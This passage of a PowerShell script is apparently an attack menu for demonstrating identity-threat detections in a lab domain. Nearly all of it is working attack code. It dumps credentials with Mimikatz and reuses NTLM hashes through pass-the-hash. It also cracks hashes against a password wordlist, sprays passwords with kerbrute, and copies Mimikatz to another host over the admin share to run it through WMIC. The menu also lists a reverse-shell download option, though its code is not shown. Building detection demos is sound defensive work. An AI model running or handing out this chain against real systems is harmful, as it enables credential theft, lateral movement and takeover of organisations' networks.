﻿﻿﻿# ============================================================
#  Identity Attack Menu - Unmanaged Workstation
#  Run as Administrator (demo account)
#  Follows the phased scenario from portable_sender.py
# ============================================================

# --- Environment Variables (set these in cmd BEFORE running) ---
# set ENV_DOMAIN=<your-ad-domain>
# set ENV_DC_IP=<DC IP address>
# set ENV_BL=<BL IP address>
# set ENV_DT=<DT IP address>

$ErrorActionPreference = "Continue"
$idpDir = "C:\IDP_Files"
$mimiExe = "$idpDir\Mimikatz\x64\mimikatz.exe"
$wordlistFile = "$idpDir\wordlist.txt"

# --- Validate env vars on startup ---
$missing = @()
if (-not $env:ENV_DOMAIN)   { $missing += "ENV_DOMAIN" }
if (-not $env:ENV_DC_IP)    { $missing += "ENV_DC_IP" }
if (-not $env:ENV_BL)       { $missing += "ENV_BL" }
if (-not $env:ENV_DT)       { $missing += "ENV_DT" }
if ($missing.Count -gt 0) {
    Write-Host "[!] Missing environment variables: $($missing -join ', ')" -ForegroundColor Red
    Write-Host "    Set them in cmd before running this script:" -ForegroundColor Yellow
    Write-Host '    set ENV_DOMAIN=lab.yourdomain.com' -ForegroundColor Gray
    Write-Host '    set ENV_DC_IP=<DC IP>' -ForegroundColor Gray
    Write-Host '    set ENV_BL=<BL IP>' -ForegroundColor Gray
    Write-Host '    set ENV_DT=<DT IP>' -ForegroundColor Gray
    pause
    exit 1
}

# Hash files saved between steps (live extraction, never hardcoded)
$clarkHashFile = "$idpDir\clark_hash.txt"
$svcHashFile = "$idpDir\svc_runbook_hash.txt"

function Get-ClarkHash {
    if (Test-Path $clarkHashFile) {
        return (Get-Content $clarkHashFile -First 1).Trim()
    }
    Write-Host "[!] No clark.monroe hash found. Run Step 1 first." -ForegroundColor Red
    return $null
}

function Get-SvcRunbookHash {
    if (Test-Path $svcHashFile) {
        return (Get-Content $svcHashFile -First 1).Trim()
    }
    Write-Host "[!] No svc_runbook hash found. Run Step 6 first." -ForegroundColor Red
    return $null
}

Write-Host "[+] Config: DOMAIN=$env:ENV_DOMAIN  DC=$env:ENV_DC_IP  BL=$env:ENV_BL  DT=$env:ENV_DT" -ForegroundColor Green
if (Test-Path $clarkHashFile) {
    Write-Host "[+] clark.monroe NTLM: $(Get-Content $clarkHashFile -First 1)" -ForegroundColor Green
} else {
    Write-Host "[*] clark.monroe hash not yet extracted. Run Step 1." -ForegroundColor Yellow
}
Start-Sleep -Seconds 2

function Show-Menu {
    param ([string]$Title = 'Identity Attacks - Unmanaged Host')
    Clear-Host
    Write-Host
    Write-Host "================ $Title ================" -ForegroundColor Cyan
    Write-Host
    Write-Host "  Kill chain: dump hash -> PtH recon -> PtH to DT (EDR) -> dump svc_runbook -> PtH to BL (EDR)" -ForegroundColor DarkGray
    Write-Host "  All steps use NTLM hashes (Pass-the-Hash) - no cleartext password needed" -ForegroundColor DarkGray
    Write-Host
    Write-Host "  --- Phase 2: Initial Access (after brute force to unmanaged) ---" -ForegroundColor Yellow
    Write-Host "  1: System recon + credential dump                [whoami, sysinfo, dump NTLM]"
    Write-Host "  2: Network discovery (ARP + port scan)           [Find DC, DT, BL on subnet]"
    Write-Host "  3: LDAP recon via PtH (enumerate AD)             [Discover svc_runbook, groups]"
    Write-Host "  4: Hash cracking + kerbrute spray                [Crack demo -> CredentialScanning]"
    Write-Host
    Write-Host "  --- Phase 4: Pivot to DT (Falcon EDR triggers) ---" -ForegroundColor Yellow
    Write-Host "  5: PtH clark.monroe -> RDP to DT                 [PassTheHash + EDR: suspicious logon]"
    Write-Host "  6: Remote dump on DT (SMB + WMIC from here)      [EDR: tool transfer, LSASS access]"
    Write-Host
    Write-Host "  --- Phase 5: Privilege Escalation + Lateral ---" -ForegroundColor Yellow
    Write-Host "  7: Kerberoast svc_runbook (via PtH context)      [Kerberoasting detection]"
    Write-Host "  8: PtH svc_runbook -> DCSync                     [PassTheHash + StaleAccount + DCSync]"
    Write-Host "  9: PtH svc_runbook -> RDP to BL                  [EDR: lateral movement to BL]"
    Write-Host
    Write-Host "  --- Optional ---" -ForegroundColor DarkGray
    Write-Host "  0: Download & execute reverse shell               [C2 callback]"
    Write-Host
    Write-Host "  Q: Quit" -ForegroundColor Red
    Write-Host
}

do {
    Show-Menu
    $selection = Read-Host "Select step"
    switch ($selection) {

        '1' {
            Clear-Host
            Write-Host "[Step 1] System Recon + Credential Dump" -ForegroundColor Cyan
            Write-Host "         Enumerating system info and dumping cached credentials..." -ForegroundColor Gray
            Write-Host

            # --- Basic recon ---
            Write-Host "--- Who am I? ---" -ForegroundColor Yellow
            whoami /all
            Write-Host

            Write-Host "--- System Info ---" -ForegroundColor Yellow
            Write-Host "  Hostname : $env:COMPUTERNAME" -ForegroundColor White
            Write-Host "  OS       : $((Get-CimInstance Win32_OperatingSystem).Caption)" -ForegroundColor White
            Write-Host "  Domain   : $((Get-CimInstance Win32_ComputerSystem).Domain)" -ForegroundColor White
            Write-Host "  Joined   : $((Get-CimInstance Win32_ComputerSystem).PartOfDomain)" -ForegroundColor White
            Write-Host

            Write-Host "--- Network Config ---" -ForegroundColor Yellow
            ipconfig /all | Select-String "IPv4|Subnet|Gateway|DNS Servers|DHCP Server"
            Write-Host

            Write-Host "--- Local Admins ---" -ForegroundColor Yellow
            net localgroup Administrators
            Write-Host

            Write-Host "--- User profiles on this machine ---" -ForegroundColor Yellow
            dir C:\Users | Select-Object Name | Format-Table -AutoSize

            Write-Host "--- Local accounts ---" -ForegroundColor Yellow
            net user

            # --- Credential dump ---
            Write-Host "--- Mimikatz Credential Dump ---" -ForegroundColor Yellow
            & $mimiExe "privilege::debug" "token::elevate" "log $idpDir\step1_cred_dump.log" "lsadump::sam" "lsadump::cache" "sekurlsa::logonpasswords" "exit"

            Write-Host "`n[+] Output saved to: $idpDir\step1_cred_dump.log" -ForegroundColor Green

            # Auto-extract clark.monroe NTLM hash from dump
            $dumpLog = "$idpDir\step1_cred_dump.log"
            if (Test-Path $dumpLog) {
                $logContent = Get-Content $dumpLog -Raw
                # sekurlsa::logonpasswords pattern: User : clark.monroe ... NTLM : <hash>
                if ($logContent -match "clark\.monroe[\s\S]*?NTLM\s*:\s*([0-9a-fA-F]{32})") {
                    $extractedClark = $Matches[1].ToLower()
                    $extractedClark | Out-File -FilePath $clarkHashFile -Encoding ASCII
                    Write-Host "[+] clark.monroe NTLM extracted and saved: $extractedClark" -ForegroundColor Green
                } else {
                    Write-Host "[!] Could not auto-extract clark.monroe hash from dump." -ForegroundColor Yellow
                    $manualHash = Read-Host "  Enter clark.monroe NTLM hash manually"
                    if ($manualHash -and $manualHash.Length -eq 32) {
                        $manualHash | Out-File -FilePath $clarkHashFile -Encoding ASCII
                        Write-Host "[+] Hash saved." -ForegroundColor Green
                    }
                }
            }

            Write-Host
            Write-Host "[*] We have the NTLM hash - all next steps use Pass-the-Hash (no password needed)." -ForegroundColor Cyan
            Write-Host "[*] Next: Step 2 (network discovery) to find targets on the subnet." -ForegroundColor Cyan
        }

        '2' {
            Clear-Host
            Write-Host "[Step 2] Network Discovery" -ForegroundColor Cyan
            Write-Host "         Enumerating network config, discovering hosts, scanning ports..." -ForegroundColor Gray
            Write-Host "         Generates traffic matching FortiGate port scan logs" -ForegroundColor Yellow
            Write-Host

            # --- Phase 1: Network config ---
            Write-Host "--- Network Configuration ---" -ForegroundColor Yellow
            $adapter = Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway }
            $myIP = $adapter.IPv4Address.IPAddress
            $gateway = $adapter.IPv4DefaultGateway.NextHop
            $dnsServers = (Get-DnsClientServerAddress -InterfaceIndex $adapter.InterfaceIndex -AddressFamily IPv4).ServerAddresses

            Write-Host "  Local IP : $myIP" -ForegroundColor White
            Write-Host "  Gateway  : $gateway" -ForegroundColor White
            Write-Host "  DNS      : $($dnsServers -join ', ')" -ForegroundColor White
            Write-Host
            Write-Host "  [*] DNS server is likely the Domain Controller" -ForegroundColor Cyan
            Write-Host

            # --- Phase 2: ARP table + discover hosts ---
            Write-Host "--- ARP Table (known neighbors) ---" -ForegroundColor Yellow
            arp -a
            Write-Host

            # Collect IPs to scan: ARP entries (non-broadcast, non-multicast) + DNS servers
            $arpEntries = arp -a | Select-String '(\d+\.\d+\.\d+\.\d+)' | ForEach-Object {
                $ip = $_.Matches[0].Value
                if ($ip -notmatch '^(224\.|239\.|255\.|169\.254)' -and $ip -ne $myIP -and $ip -ne "255.255.255.255") {
                    $ip
                }
            } | Sort-Object -Unique

            # Add DNS servers (likely DC on different subnet)
            $allTargets = @($arpEntries) + @($dnsServers) | Sort-Object -Unique
            Write-Host "--- Discovered hosts to scan ---" -ForegroundColor Yellow
            $allTargets | ForEach-Object { Write-Host "  $_" -ForegroundColor White }
            Write-Host

            # --- Phase 3: Port scan each host ---
            $scanPorts = @(88, 389, 636, 445, 3389, 135, 5985, 22, 53)
            $discovered = @()

            Write-Host "--- Port scan (TCP) ---" -ForegroundColor Yellow
            foreach ($ip in $allTargets) {
                Write-Host "`n  Scanning $ip ..." -ForegroundColor White
                $openPorts = @()

                foreach ($port in $scanPorts) {
                    $tcp = New-Object System.Net.Sockets.TcpClient
                    try {
                        $tcp.ConnectAsync($ip, $port).Wait(1000) | Out-Null
                        if ($tcp.Connected) {
                            Write-Host "    Port $port : OPEN" -ForegroundColor Green
                            $openPorts += $port
                        }
                    } catch { }
                    $tcp.Close()
                }

                if ($openPorts.Count -eq 0) {
                    Write-Host "    No open ports found" -ForegroundColor DarkGray
                }

                # Auto-identify role based on open ports
                $role = ""
                if ($openPorts -contains 88 -and $openPorts -contains 389) {
                    $role = "DOMAIN CONTROLLER"
                } elseif ($openPorts -contains 3389 -and $openPorts -contains 445) {
                    $role = "WORKSTATION/SERVER"
                } elseif ($ip -eq $gateway) {
                    $role = "GATEWAY"
                }

                if ($role) {
                    Write-Host "    >> Identified: $role" -ForegroundColor Cyan
                }

                $discovered += [PSCustomObject]@{
                    IP = $ip
                    Role = $role
                    Ports = ($openPorts -join ',')
                }
            }

            # --- Summary ---
            Write-Host "`n--- Discovery Summary ---" -ForegroundColor Yellow
            foreach ($h in $discovered) {
                $label = if ($h.Role) { " [$($h.Role)]" } else { "" }
                $ports = if ($h.Ports) { " Ports: $($h.Ports)" } else { " (no open ports)" }
                Write-Host "  $($h.IP)${label}${ports}" -ForegroundColor $(if ($h.Role -eq "DOMAIN CONTROLLER") { "Red" } elseif ($h.Role) { "Yellow" } else { "Gray" })
            }

            # Save DC IP for other steps
            $dcHost = $discovered | Where-Object { $_.Role -eq "DOMAIN CONTROLLER" } | Select-Object -First 1
            if ($dcHost) {
                Write-Host "`n[+] Domain Controller found: $($dcHost.IP)" -ForegroundColor Green
                $dcHost.IP | Out-File -FilePath "$idpDir\discovered_dc.txt" -Encoding ASCII
            }

            Write-Host "[*] Next: Step 3 (LDAP recon via PtH) to enumerate AD." -ForegroundColor Cyan
        }

        '3' {
            Clear-Host
            Write-Host "[Step 3] LDAP Reconnaissance via Pass-the-Hash" -ForegroundColor Cyan
            Write-Host "         PtH clark.monroe -> spawn PowerShell -> LDAP queries" -ForegroundColor Gray
            Write-Host "         Generates LDAP traffic matching FortiGate sample [108]" -ForegroundColor Yellow
            Write-Host

            # Create LDAP recon script that runs in PtH context
            $ldapScript = @'
$ErrorActionPreference = "Continue"
$dcIP = $env:ENV_DC_IP
$idpDir = "C:\IDP_Files"

Write-Host "`n--- Enumerating AD via LDAP ($dcIP) ---" -ForegroundColor Yellow
try {
    $entry = New-Object DirectoryServices.DirectoryEntry("LDAP://$dcIP")
    $searcher = New-Object DirectoryServices.DirectorySearcher($entry)
    $searcher.Filter = "(&(objectCategory=person)(objectClass=user))"
    $searcher.PropertiesToLoad.AddRange(@("samaccountname","displayname","memberof","serviceprincipalname"))
    $results = $searcher.FindAll()

    $svcAccounts = @()
    foreach ($r in $results) {
        $sam = $r.Properties["samaccountname"][0]
        $spns = $r.Properties["serviceprincipalname"]
        $memberof = $r.Properties["memberof"]

        $privGroups = @()
        foreach ($grp in $memberof) {
            if ($grp -match "Domain Admins|Enterprise Admins|Administrators|Account Operators") {
                $privGroups += ($grp -split ',')[0] -replace 'CN=',''
            }
        }

        $prefix = "  "
        if ($spns.Count -gt 0) { $prefix = "* "; $svcAccounts += $sam }
        if ($privGroups.Count -gt 0) { $prefix = "! " }

        $line = "${prefix}${sam}"
        if ($privGroups.Count -gt 0) { $line += " [PRIV: $($privGroups -join ', ')]" }
        if ($spns.Count -gt 0) { $line += " [SPN: $($spns -join ', ')]" }

        Write-Host $line -ForegroundColor $(if ($prefix -eq "! ") { "Red" } elseif ($prefix -eq "* ") { "Yellow" } else { "Gray" })
    }

    Write-Host "`n  Legend: ! = privileged group  * = has SPN (kerberoastable)" -ForegroundColor DarkGray
    Write-Host "  Total users found: $($results.Count)" -ForegroundColor White

    $userList = $results | ForEach-Object { $_.Properties["samaccountname"][0] }
    $userList | Out-File -FilePath "$idpDir\ldap_users.txt" -Encoding ASCII
    Write-Host "`n[+] User list saved to: $idpDir\ldap_users.txt" -ForegroundColor Green

    if ($svcAccounts.Count -gt 0) {
        Write-Host "[!] Kerberoastable: $($svcAccounts -join ', ')" -ForegroundColor Red
    }
    $results.Dispose()
    $entry.Close()
} catch {
    Write-Host "[!] LDAP failed: $_" -ForegroundColor Red
}
Write-Host "`nPress any key to close..." -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
'@
            $ldapScript | Out-File -FilePath "$idpDir\ldap_recon.ps1" -Encoding ASCII

            # Create a batch launcher (mimikatz /run: only takes a single exe, no args)
            $batContent = '@powershell -ExecutionPolicy Bypass -File C:\IDP_Files\ldap_recon.ps1'
            $batContent | Out-File -FilePath "$idpDir\run_ldap_recon.bat" -Encoding ASCII

            Write-Host "  Launching PtH clark.monroe -> LDAP recon..." -ForegroundColor White
            Write-Host "  (A new window will open with LDAP results)" -ForegroundColor Gray
            Write-Host

            $clarkHash = Get-ClarkHash
            if (-not $clarkHash) { break }

            # PtH to spawn batch file in clark.monroe context
            & $mimiExe "privilege::debug" "sekurlsa::pth /user:clark.monroe /domain:$env:ENV_DOMAIN /ntlm:$clarkHash /run:$idpDir\run_ldap_recon.bat" "exit"

            Write-Host "`n[+] LDAP recon launched in PtH context." -ForegroundColor Green
            Write-Host "[*] Check the new window for results." -ForegroundColor Cyan
            Write-Host "[*] User list will be saved to $idpDir\ldap_users.txt" -ForegroundColor Cyan
        }

        '4' {
            Clear-Host
            Write-Host "[Step 4] Hash Cracking + Credential Scanning" -ForegroundColor Cyan
            Write-Host "         Step 4a: Crack demo account NTLM hash from Step 1 dump" -ForegroundColor Gray
            Write-Host "         Step 4b: Spray cracked password via kerbrute" -ForegroundColor Gray
            Write-Host "         Triggers: CredentialScanningActiveDirectory" -ForegroundColor Yellow
            Write-Host

            # --- Step 4a: Crack the demo NTLM hash ---
            Write-Host "--- 4a: NTLM Hash Cracking ---" -ForegroundColor Yellow
            Write-Host

            # Try to extract demo hash from Step 1 dump log
            $demoHash = $null
            $dumpLog = "$idpDir\step1_cred_dump.log"
            if (Test-Path $dumpLog) {
                $logContent = Get-Content $dumpLog -Raw
                # Match SAM dump pattern: User : demo ... Hash NTLM: <hash>
                if ($logContent -match "User\s*:\s*demo[\s\S]*?Hash NTLM\s*:\s*([0-9a-fA-F]{32})") {
                    $demoHash = $Matches[1].ToLower()
                    Write-Host "  [+] Extracted demo NTLM from Step 1 dump: $demoHash" -ForegroundColor Green
                }
            }

            if (-not $demoHash) {
                Write-Host "  [*] Could not auto-extract demo hash from dump log." -ForegroundColor Yellow
                $demoHash = Read-Host "  Enter the demo account NTLM hash (from Step 1)"
            }

            if (-not $demoHash -or $demoHash.Length -ne 32) {
                Write-Host "  [!] Invalid hash. Run Step 1 first to dump credentials." -ForegroundColor Red
                Write-Host "  [*] You can also manually enter a password for kerbrute below." -ForegroundColor Gray
            }

            $crackedPw = $null
            if ($demoHash -and $demoHash.Length -eq 32) {
                Write-Host
                Write-Host "  [*] Attempting offline dictionary attack against NTLM hash..." -ForegroundColor White
                Write-Host "  [*] Testing common passwords..." -ForegroundColor Gray
                Write-Host

                # NTLM = MD4(UTF-16LE(password)) - compute and compare
                # Load wordlist from external file, fallback to small embedded list
                if (Test-Path $wordlistFile) {
                    $wordlist = Get-Content $wordlistFile | Where-Object { $_.Trim() -ne "" }
                    Write-Host "  [*] Loaded $($wordlist.Count) passwords from $wordlistFile" -ForegroundColor Gray
                } else {
                    Write-Host "  [*] No wordlist.txt found, using built-in mini list" -ForegroundColor Gray
                    Write-Host "  [*] Drop a larger wordlist at $wordlistFile for better results" -ForegroundColor Gray
                    $wordlist = @(
                        "password", "Password1", "Password123", "Welcome1", "Welcome123",
                        "Changeme1", "Changeme123", "Summer2024", "Winter2024", "Spring2024",
                        "P@ssw0rd", "P@ssword1", "Admin123", "admin", "letmein",
                        "qwerty123", "abc123", "monkey123", "dragon", "master",
                        "demo", "Demo", "Demo1", "Demo123", "demo123",
                        "DemoUser1", "DemoPass1", "D3mo!", "demo!@#",
                        "CrowdStrike1", "Falcon123", "Test1234", "test", "Test123",
                        "Company1", "Company123", "Passw0rd!", "Passw0rd",
                        "1234567890", "Football1", "Baseball1", "iloveyou",
                        "trustno1", "shadow", "sunshine", "princess",
                        "!@#$%^&*", "Aa123456", "Zaq12wsx", "Qwerty1!"
                    )
                }

                # MD4 via .NET (used by NTLM)
                Add-Type -TypeDefinition @"
using System;
using System.Text;
using System.Security.Cryptography;
public class NTLM {
    public static string Hash(string password) {
        byte[] data = Encoding.Unicode.GetBytes(password);
        // MD4 via BCrypt
        byte[] hash;
        using (var md4 = System.Security.Cryptography.MD4.Create()) {
            hash = md4.ComputeHash(data);
        }
        return BitConverter.ToString(hash).Replace("-","").ToLower();
    }
}
"@ -ErrorAction SilentlyContinue

                # Fallback: use mimikatz or manual MD4 if .NET MD4 unavailable
                $useFallback = $false
                try {
                    $testHash = [NTLM]::Hash("test")
                    if (-not $testHash) { $useFallback = $true }
                } catch {
                    $useFallback = $true
                }

                if ($useFallback) {
                    # Manual MD4 in PowerShell (pure implementation)
                    Write-Host "  [*] Using built-in MD4 implementation..." -ForegroundColor Gray
                    function Get-NTLMHash {
                        param([string]$Password)
                        $bytes = [System.Text.Encoding]::Unicode.GetBytes($Password)
                        # Use Windows CryptoAPI via P/Invoke
                        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class CryptoMD4 {
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool CryptAcquireContext(ref IntPtr hProv, string pszContainer, string pszProvider, uint dwProvType, uint dwFlags);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool CryptCreateHash(IntPtr hProv, uint algId, IntPtr hKey, uint dwFlags, ref IntPtr hHash);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool CryptHashData(IntPtr hHash, byte[] pbData, uint dataLen, uint dwFlags);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool CryptGetHashParam(IntPtr hHash, uint dwParam, byte[] pbData, ref uint pdwDataLen, uint dwFlags);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool CryptDestroyHash(IntPtr hHash);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool CryptReleaseContext(IntPtr hProv, uint dwFlags);

    public static string ComputeMD4(byte[] data) {
        IntPtr hProv = IntPtr.Zero;
        IntPtr hHash = IntPtr.Zero;
        // PROV_RSA_FULL=1, CRYPT_VERIFYCONTEXT=0xF0000000, CALG_MD4=0x8002
        CryptAcquireContext(ref hProv, null, null, 1, 0xF0000000);
        CryptCreateHash(hProv, 0x8002, IntPtr.Zero, 0, ref hHash);
        CryptHashData(hHash, data, (uint)data.Length, 0);
        byte[] hash = new byte[16];
        uint len = 16;
        CryptGetHashParam(hHash, 2, hash, ref len, 0);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return BitConverter.ToString(hash).Replace("-","").ToLower();
    }
}
"@ -ErrorAction SilentlyContinue
                        return [CryptoMD4]::ComputeMD4($bytes)
                    }
                }

                $attempts = 0
                $startTime = Get-Date
                foreach ($pw in $wordlist) {
                    $attempts++
                    try {
                        if ($useFallback) {
                            $computed = Get-NTLMHash -Password $pw
                        } else {
                            $computed = [NTLM]::Hash($pw)
                        }

                        if ($computed -eq $demoHash) {
                            $elapsed = ((Get-Date) - $startTime).TotalSeconds
                            Write-Host "  [+] CRACKED! Password: $pw" -ForegroundColor Green
                            Write-Host "  [+] Attempts: $attempts | Time: $([math]::Round($elapsed,2))s" -ForegroundColor Green
                            Write-Host "  [+] Hash match: $computed = $demoHash" -ForegroundColor DarkGreen
                            $crackedPw = $pw
                            break
                        }
                    } catch {
                        # Skip hash computation errors
                    }

                    # Progress every 10 attempts
                    if ($attempts % 10 -eq 0) {
                        Write-Host "  [*] Tried $attempts passwords..." -ForegroundColor DarkGray
                    }
                }

                if (-not $crackedPw) {
                    $elapsed = ((Get-Date) - $startTime).TotalSeconds
                    Write-Host "  [-] Exhausted wordlist ($attempts passwords in $([math]::Round($elapsed,2))s)" -ForegroundColor Yellow
                    Write-Host "  [*] Try a larger wordlist (rockyou.txt) offline with hashcat:" -ForegroundColor Gray
                    Write-Host "      hashcat -m 1000 $demoHash /usr/share/wordlists/rockyou.txt" -ForegroundColor Gray
                }
            }

            # --- Step 4b: kerbrute password spray ---
            Write-Host
            Write-Host "--- 4b: Kerbrute Password Spray ---" -ForegroundColor Yellow
            Write-Host

            # Use LDAP-harvested list if available, fallback to static list
            $userFile = "$idpDir\ldap_users.txt"
            if (-not (Test-Path $userFile)) {
                $userFile = "$idpDir\users.txt"
                Write-Host "  Using static user list (run Step 3 first for LDAP list)" -ForegroundColor Yellow
            } else {
                Write-Host "  Using LDAP-harvested user list" -ForegroundColor Green
            }
            Write-Host "  DC: $env:ENV_DC_IP  Domain: $env:ENV_DOMAIN" -ForegroundColor Gray
            Write-Host

            if ($crackedPw) {
                Write-Host "  [+] Using cracked password: $crackedPw" -ForegroundColor Green
                $sprayPw = $crackedPw
            } else {
                $sprayPw = Read-Host "  Enter password to spray (or press Enter to skip)"
            }

            if ($sprayPw) {
                Write-Host
                Write-Host "  [*] Spraying $sprayPw against all users via Kerberos pre-auth..." -ForegroundColor White
                Write-Host "  [*] This will trigger CredentialScanningActiveDirectory in CrowdStrike IDP" -ForegroundColor Yellow
                Write-Host

                try {
                    $proc = Start-Process -FilePath "$idpDir\kerbrute.exe" `
                        -ArgumentList "passwordspray --dc $env:ENV_DC_IP -d $env:ENV_DOMAIN `"$userFile`" $sprayPw" `
                        -NoNewWindow -Wait -PassThru
                    Write-Host "`n  [+] Kerbrute finished (exit code: $($proc.ExitCode))." -ForegroundColor Green
                } catch {
                    Write-Host "  [!] Kerbrute error: $_" -ForegroundColor Red
                }
            } else {
                Write-Host "  [*] Skipped. Moving to PtH-based attacks." -ForegroundColor Cyan
            }

            Write-Host
            Write-Host "[*] Next: Step 5 (PtH clark.monroe -> RDP to DT)." -ForegroundColor Cyan
        }

        '5' {
            Clear-Host
            Write-Host "[Step 5] PtH clark.monroe -> RDP to DT" -ForegroundColor Cyan
            Write-Host "         Using clark.monroe NTLM hash from Step 1 dump..." -ForegroundColor Gray
            Write-Host "         Triggers: PassTheHash (Identity) + suspicious logon (EDR on DT)" -ForegroundColor Yellow
            Write-Host

            Write-Host "  User:   clark.monroe" -ForegroundColor White
            Write-Host "  Domain: $env:ENV_DOMAIN" -ForegroundColor White
            Write-Host "  Target: $env:ENV_DT (DT)" -ForegroundColor White
            Write-Host

            $clarkHash = Get-ClarkHash
            if (-not $clarkHash) { break }
            Write-Host "  NTLM:   $clarkHash" -ForegroundColor White

            # Create batch launcher for RDP (mimikatz /run: can't pass args to exe)
            "mstsc /v:$env:ENV_DT" | Out-File -FilePath "$idpDir\run_rdp_dt.bat" -Encoding ASCII

            Start-Process -FilePath "cmd.exe" -ArgumentList "/k `"$mimiExe`" `"privilege::debug`" `"sekurlsa::pth /user:clark.monroe /domain:$env:ENV_DOMAIN /ntlm:$clarkHash /run:$idpDir\run_rdp_dt.bat`""

            Write-Host "[+] Mimikatz PtH launched - RDP window should open to DT." -ForegroundColor Green
            Write-Host "[*] On DT: open admin cmd and run Step 6 commands to dump svc_runbook." -ForegroundColor Cyan
        }

        '6' {
            Clear-Host
            Write-Host "[Step 6] Remote Credential Dump on DT" -ForegroundColor Cyan
            Write-Host "         PtH clark.monroe -> SMB copy mimikatz -> WMIC remote exec" -ForegroundColor Gray
            Write-Host "         Triggers: EDR lateral tool transfer, LSASS access, cred theft" -ForegroundColor Yellow
            Write-Host

            $clarkHash = Get-ClarkHash
            if (-not $clarkHash) { break }

            # Build the remote dump script that will run in PtH context
            $remoteDumpScript = @"
`$ErrorActionPreference = "Continue"
`$target = "`$env:ENV_DT"
`$idpDir = "C:\IDP_Files"
`$localMimi = "`$idpDir\Mimikatz\x64\mimikatz.exe"
`$remotePath = "\\`$target\C`$\Temp"
`$remoteMimi = "`$remotePath\mimikatz.exe"
`$remoteBat = "`$remotePath\run_dump.bat"
`$remoteDump = "`$remotePath\cred_dump.log"
`$localDump = "`$idpDir\dt_cred_dump.log"

Write-Host ""
Write-Host "=== Remote Credential Dump on `$target ===" -ForegroundColor Cyan
Write-Host ""

# --- Phase 1: Enumerate remote accounts ---
Write-Host "--- 6a: Remote Account Enumeration ---" -ForegroundColor Yellow
Write-Host ""
Write-Host "  [*] Querying logged-on users on `$target ..." -ForegroundColor White
try {
    `$sessions = qwinsta /server:`$target 2>&1
    Write-Host `$sessions
} catch {
    Write-Host "  [!] qwinsta failed: `$_" -ForegroundColor Red
}
Write-Host ""

Write-Host "  [*] Listing remote shares on `$target ..." -ForegroundColor White
net view \\`$target 2>&1 | ForEach-Object { Write-Host "  `$_" }
Write-Host ""

Write-Host "  [*] Listing local accounts on `$target ..." -ForegroundColor White
try {
    wmic /node:`$target useraccount where "LocalAccount=True" get Name,SID 2>&1 | ForEach-Object { Write-Host "  `$_" }
} catch {
    Write-Host "  [!] WMIC user enum failed" -ForegroundColor Red
}
Write-Host ""

Write-Host "  [*] Listing services running as domain accounts ..." -ForegroundColor White
try {
    wmic /node:`$target service where "StartName like '%%\\%%'" get Name,StartName,State 2>&1 | ForEach-Object { Write-Host "  `$_" }
} catch {
    Write-Host "  [!] WMIC service enum failed" -ForegroundColor Red
}
Write-Host ""

# --- Phase 2: Copy mimikatz to DT via admin share ---
Write-Host "--- 6b: Lateral Tool Transfer ---" -ForegroundColor Yellow
Write-Host ""
Write-Host "  [*] Creating remote directory \\`$target\C`$\Temp ..." -ForegroundColor White
New-Item -Path `$remotePath -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null

Write-Host "  [*] Copying mimikatz.exe to `$remoteMimi ..." -ForegroundColor White
try {
    Copy-Item `$localMimi `$remoteMimi -Force
    Write-Host "  [+] Mimikatz copied to DT." -ForegroundColor Green
} catch {
    Write-Host "  [!] Copy failed: `$_" -ForegroundColor Red
    Write-Host "  Press any key to close..." -ForegroundColor Gray
    `$null = `$Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}

# Create a batch file on DT that runs mimikatz and dumps output
`$dumpBat = @"
@echo off
C:\Temp\mimikatz.exe "privilege::debug" "token::elevate" "log C:\Temp\cred_dump.log" "lsadump::sam" "sekurlsa::logonpasswords" "exit"
"@
`$dumpBat | Out-File -FilePath `$remoteBat -Encoding ASCII
Write-Host "  [+] Dump batch file written to DT." -ForegroundColor Green
Write-Host ""

# --- Phase 3: Remote execution via WMIC ---
Write-Host "--- 6c: Remote Execution (WMIC) ---" -ForegroundColor Yellow
Write-Host ""
Write-Host "  [*] Executing mimikatz remotely on `$target via WMIC ..." -ForegroundColor White
Write-Host "  [*] This triggers: LSASS access + credential dumping on EDR-managed DT" -ForegroundColor Yellow
Write-Host ""

try {
    wmic /node:`$target process call create "cmd.exe /c C:\Temp\run_dump.bat" 2>&1 | ForEach-Object { Write-Host "  `$_" }
    Write-Host ""
    Write-Host "  [*] Waiting 15 seconds for remote execution to complete ..." -ForegroundColor Gray
    Start-Sleep -Seconds 15
} catch {
    Write-Host "  [!] WMIC exec failed: `$_" -ForegroundColor Red
}

# --- Phase 4: Retrieve dump and parse ---
Write-Host "--- 6d: Retrieve + Parse Dump ---" -ForegroundColor Yellow
Write-Host ""
Write-Host "  [*] Copying dump file back from DT ..." -ForegroundColor White
try {
    Copy-Item `$remoteDump `$localDump -Force
    Write-Host "  [+] Dump retrieved: `$localDump" -ForegroundColor Green
} catch {
    Write-Host "  [!] Could not retrieve dump: `$_" -ForegroundColor Red
    Write-Host "  [*] Try increasing wait time or check if mimikatz ran on DT." -ForegroundColor Gray
    Write-Host "  Press any key to close..." -ForegroundColor Gray
    `$null = `$Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}

# Parse for svc_runbook hash
Write-Host ""
Write-Host "  [*] Parsing dump for svc_runbook ..." -ForegroundColor White
`$content = Get-Content `$localDump -Raw

# Show all domain accounts found
Write-Host ""
Write-Host "  --- Domain accounts in dump ---" -ForegroundColor Yellow
`$regex = [regex]"User Name\s*:\s*(\S+)[\s\S]*?NTLM\s*:\s*([0-9a-fA-F]{32})"
`$matches2 = `$regex.Matches(`$content)
foreach (`$m in `$matches2) {
    `$u = `$m.Groups[1].Value
    `$h = `$m.Groups[2].Value
    `$highlight = if (`$u -match "svc_runbook") { "Green" } else { "White" }
    Write-Host "    `$u : `$h" -ForegroundColor `$highlight
}

# Also try sekurlsa pattern
`$regex2 = [regex]"(?ms)Username\s*:\s*(\S+)\s*\*\s*Domain\s*:\s*\S+\s*\*\s*NTLM\s*:\s*([0-9a-fA-F]{32})"
